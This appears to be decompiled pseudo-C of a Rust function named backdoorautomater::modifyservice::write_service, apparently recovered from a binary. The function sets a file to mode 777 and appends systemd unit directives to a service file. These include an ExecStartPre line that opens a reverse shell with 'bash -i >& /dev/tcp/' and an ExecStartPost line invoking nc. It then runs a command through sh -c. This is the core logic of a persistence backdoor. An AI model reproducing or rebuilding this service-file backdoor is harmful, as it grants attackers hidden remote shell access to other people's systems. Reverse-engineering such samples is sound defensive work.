long long backdoorautomater::modifyservice::write_service(struct_0 *a0, struct_0 *a1, unsigned long long a2)
{
    unsigned int v0;  // [bp-0x1dc]
    unsigned long long v1;  // [bp-0x1d8]
    unsigned long long v2;  // [bp-0x1d0]
    unsigned long v3;  // [bp-0x1c8]
    int v4;  // [bp-0x1b8]
    unsigned long long v5;  // [bp-0x1a8]
    int v6;  // [bp-0x1a0], Other Possible Types: char
    char v7;  // [bp-0x190]
    int v8;  // [bp-0x168]
    unsigned long long v9;  // [bp-0x158]
    int v10;  // [bp-0x148]
    unsigned long long v11;  // [bp-0x140]
    unsigned long long v12;  // [bp-0x138]
    unsigned long long v13;  // [bp-0x128]
    char v14;  // [bp-0x120]
    int v15;  // [bp-0x108], Other Possible Types: unsigned long
    unsigned int v16;  // [bp-0x104]
    unsigned long long v17;  // [bp-0x100]
    int v18;  // [bp-0xf8], Other Possible Types: unsigned long
    int v19;  // [bp-0xf0], Other Possible Types: unsigned long long
    unsigned long v20;  // [bp-0xe0]
    int v22;  // xmm0
    unsigned long long v23;  // rbp
    unsigned long long v24;  // rdx
    struct_1 *v25;  // rax
    unsigned long long v26;  // rdx

    v18 = a1->field_10;
    *((uint128_t *)&v15) = a1->field_0;
    *((uint128_t *)&v19) = a0->field_0;
    v20 = a0->field_10;
    alloc::str::join_generic_copy(&v6, &(char)v15, 2, 1, 0);
    v5 = *((long long *)&v7);
    v4 = v6;
    ::0x452120::core::ptr::drop_in_place<[alloc::string::String; 2]>(&(char)v15);
    v22 = (int128_t)(&v4)[8];
    v15 = "chmod 777 ";
    v17 = 10;
    v18 = v22;
    alloc::str::join_generic_copy(&v6, &(char)v15, 2, 1, 0);
    v9 = *((long long *)&v7);
    v8 = v6;
    (char)v15.create(&(char)v4);
    if ((int)v15)
    {
        ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v8);
        ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&(char)v4);
        return 10;
    }
    v0 = v16;
    v1 = a2.into_iter();
    v2 = v24;
    if (v1.next())
    {
        do
        {
            *((int128_t *)&v15) = *((int128_t *)&(&v25->padding_0)[1]);
            v18 = "\n[Install]okExecStartPost=nc ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs";
            v19 = 1;
            alloc::str::join_generic_copy(&v6, &(char)v15, 2, 1, 0);
            v26 = *((long long *)&v7);
            v12 = *((long long *)&v7);
            v10 = v6;
            v23 = v0.write_all(v11, v26);
            if (v23)
            {
                ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&(char)v10);
                ::0x451f50::core::ptr::drop_in_place<std::fs::File>(v0);
                ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v8);
                ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&(char)v4);
                return v23;
            }
            ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&(char)v10);
            v25 = v1.next();
        } while (v25);
    }
    (char)v15.new("sh-cFailed to execute commandsrc/modifyservice.rs", 2);
    v6.output((char)v15.arg("-cFailed to execute commandsrc/modifyservice.rs", 2).arg(&v8));
    (char)v10.expect(&v6, &g_629f60);
    ::0x451fc0::core::ptr::drop_in_place<std::process::Command>(&(char)v15);
    v6.from_utf8_lossy(v13, *((long long *)&v14));
    (char)v15.to_vec(v6.deref(), a2);
    v3 = v18;
    memcpy(&v1, &(char)v15, 16);
    ::0x452060::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v6);
    backdoorautomater::sanitizer::sanitize_system_command(&v1);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v1);
    ::0x451f60::core::ptr::drop_in_place<std::process::Output>(&(char)v10);
    ::0x451f50::core::ptr::drop_in_place<std::fs::File>(v0);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v8);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&(char)v4);
    return 0;
}
